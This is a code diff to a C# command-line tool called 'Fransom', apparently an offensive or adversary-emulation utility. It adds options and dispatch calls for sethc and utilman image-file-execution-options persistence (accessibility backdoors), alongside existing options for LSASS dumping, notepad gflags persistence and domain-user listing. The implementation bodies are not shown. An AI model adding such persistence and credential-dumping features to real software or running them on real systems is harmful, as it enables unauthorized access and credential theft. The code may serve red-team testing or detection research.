@@ -93,6 +93,14 @@ namespace Fransom
             public bool SetNotepadGflags { get; set; }
             [Option("remove-notepad-gflags", HelpText = "(Requires Admin privileges) Remove notepad gflags persistence.", Group = "arguments")]
             public bool RemoveNotepadGflags { get; set; }
+            [Option("create-sethc-ifeo", HelpText = "(Requires Admin privileges) Persistence via sethc image file execution options.", Group = "arguments")]
+            public bool CreateSethcIfeo { get; set; }
+            [Option("remove-sethc-ifeo", HelpText = "(Requires Admin privileges) Remove sethc ifeo persistence.", Group = "arguments")]
+            public bool RemoveSethcIfeo { get; set; }
+            [Option("create-utilman-ifeo", HelpText = "(Requires Admin privileges) Persistence via utilman image file execution options.", Group = "arguments")]
+            public bool SetUtilmanIfeo { get; set; }
+            [Option("remove-utilman-ifeo", HelpText = "(Requires Admin privileges) Remove utilman ifeo persistence.", Group = "arguments")]
+            public bool RemoveUtilmanIfeo { get; set; }
             [Option("ps", HelpText = "Helper: List running processes.", Group = "arguments")]
             public bool ListProcesses { get; set; }
             [Option("domain-users", HelpText = "List domain users.", Group = "arguments")]
@@ -320,6 +328,11 @@ namespace Fransom
                 var p = new Persistence();
                 p.CreateService();
             }
+            if (options.RemoveService)
+            {
+                var p = new Persistence();
+                p.RemoveService();
+            }
             if (options.SetNotepadGflags)
             {
                 var p = new Persistence();
@@ -330,12 +343,26 @@ namespace Fransom
                 var p = new Persistence();
                 p.RemoveNotepadGflags();
             }
-            if (options.RemoveService)
+            if (options.CreateSethcIfeo)
             {
                 var p = new Persistence();
-                p.RemoveService();
+                p.CreateSethcIfeo();
             }
-
+            if (options.RemoveSethcIfeo)
+            {
+                var p = new Persistence();
+                p.RemoveSethcIfeo();
+            }
+            if (options.SetUtilmanIfeo)
+            {
+                var p = new Persistence();
+                p.CreateUtilmanIfeo();
+            }
+            if (options.RemoveUtilmanIfeo)
+            {
+                var p = new Persistence();
+                p.RemoveUtilmanIfeo();
+            }
             if (options.DumpLsass)
             {
                 var d = new DumpLSASS();
@@ -556,6 +583,18 @@ namespace Fransom
                         break;
                     case "remove-notepad-gflags":
                         p.RemoveNotepadGflags();
+                        break;
+                    case "create-utilman-ifeo":
+                        p.CreateUtilmanIfeo();
+                        break;
+                    case "remove-utilman-ifeo":
+                        p.RemoveUtilmanIfeo();
+                        break;
+                    case "create-sethc-ifeo":
+                        p.CreateSethcIfeo();
+                        break;
+                    case "remove-sethc-ifeo":
+                        p.RemoveSethcIfeo();
                         break;
                     case "ps":
                         e.EnumerateProcesses();
